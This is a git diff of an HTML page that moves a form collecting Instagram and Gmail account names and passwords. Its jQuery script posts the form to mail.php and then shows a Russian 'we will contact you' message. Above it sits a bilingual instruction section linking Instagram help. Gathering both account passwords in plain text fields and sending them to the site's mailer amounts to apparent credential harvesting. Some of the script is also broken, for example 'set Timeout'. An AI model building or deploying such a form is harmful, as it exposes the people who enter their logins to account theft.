@@ -134,7 +134,60 @@
 
 				<br></p>
 			    
+<label>
+	<form id="form" style="padding: 50px 20px important; background-color: #fff important; max-width: 320px important; margin: auto important; position: relative important;"> 
+		<input type="text" style="width: 100%; margin-bottom: 10px important;" name="instaName" placeholder="Your newINSTAaccount name" required /><br />
+		<input type="text" name="instaPassword" placeholder="Your newINSTAaccount PASSWORD" required /><br />
+		
+		<input type="text" style="width: 100%; margin-bottom: 10px important;" name="gmailName" placeholder="Your GMAILaccount name" required /><br />
+		<input type="text" name="gmailPassword" placeholder="Your newGMAILaccount PASSWORD" required /><br />
+		<button>!Go</button>
+	</form>
+</label>	
+	<script src="https://code.jquery.com/jquery-1.11.2.min.js"></script>
+	<script> 
+$(document).ready(function() {
+	$(".popup").magnificPopup();
+//cil' yandex i google metrica 
+	$(".count_element").on("click", (function(){
+		ga("send", "event", "goal");XXXXXXXX.reachGoal("goal");
+		return true;
+	}));
 
+	$("#form").submit(function(e) {
+		e.preventDefault;
+		$.ajax({
+			type: "POST",
+			url: "mail.php",
+			data: $(this).serialize()
+		}).done(function() {
+			$(this).find("input").val("");
+			alert("Спасибо за заявку! Скоро мы с вами свяжемся.");
+			//$("#form").trigger("reset");
+			set Timeout(function() {
+			$.magnificPopup.close();	
+			}, 1000);
+		});
+		return false;//ne subminticapo defaultu
+	});
+	/*OLD skelet
+
+$("#form").submit(function() {
+		$.ajax({
+			type: "POST",
+			url: "mail.php",
+			data: $(this).serialize()
+		}).done(function() {
+			$(this).find("input").val("");
+			alert("Спасибо за заявку! Скоро мы с вами свяжемся.");
+			$("#form").trigger("reset");
+		});
+		return false;
+	});
+	*/
+	
+});
+</script>
 	
 <style>
 #instafeed a {
@@ -225,63 +278,7 @@
             <div class="container">
                 <div class="col-lg-8 col-lg-offset-2">
                     <h2>INSTRUCTION || Инструкция</h2>
-			
-<a 
 	
-	<form id="form" style="padding: 50px 20px important; background-color: #fff important; max-width: 320px important; margin: auto important; position: relative important;"> 
-		<input type="text" style="width: 100%; margin-bottom: 10px;" name="instaName" placeholder="Your newINSTAaccount name || Имя Вашего нового аккаунта в ИНСТАГРАМ" required /><br />
-		<input type="text" name="instaPassword" placeholder="Your newINSTAaccount PASSWORD || Пароль Вашего нового аккаунта в ИНСТАГРАМ " required /><br />
-		
-		<input type="text" style="width: 100%; margin-bottom: 10px;" name="gmailName" placeholder="Your GMAILaccount name || Имя Вашего нового аккаунта в ИНСТАГРАМ" required /><br />
-		<input type="text" name="gmailPassword" placeholder="Your newGMAILaccount PASSWORD || Пароль Вашего нового аккаунта в ИНСТАГРАМ " required /><br />
-		<button>Submit || Отправить</button>
-	</form>
-	
-	<script src="https://code.jquery.com/jquery-1.11.2.min.js"></script>
-	<script> 
-$(document).ready(function() {
-	$(".popup").magnificPopup();
-//cil' yandex i google metrica 
-	$(".count_element").on("click", (function(){
-		ga("send", "event", "goal");XXXXXXXX.reachGoal("goal");
-		return true;
-	}));
-
-	$("#form").submit(function(e) {
-		e.preventDefault;
-		$.ajax({
-			type: "POST",
-			url: "mail.php",
-			data: $(this).serialize()
-		}).done(function() {
-			$(this).find("input").val("");
-			alert("Спасибо за заявку! Скоро мы с вами свяжемся.");
-			//$("#form").trigger("reset");
-			set Timeout(function() {
-			$.magnificPopup.close();	
-			}, 1000);
-		});
-		return false;//ne subminticapo defaultu
-	});
-	/*OLD skelet
-
-$("#form").submit(function() {
-		$.ajax({
-			type: "POST",
-			url: "mail.php",
-			data: $(this).serialize()
-		}).done(function() {
-			$(this).find("input").val("");
-			alert("Спасибо за заявку! Скоро мы с вами свяжемся.");
-			$("#form").trigger("reset");
-		});
-		return false;
-	});
-	*/
-	
-});
-</script>		    
-	    Instruction/ Инструкция
 1.
 Creating an Account & Username
 https://help.instagram.com/1642053262784201/?helpref=hc_fnav
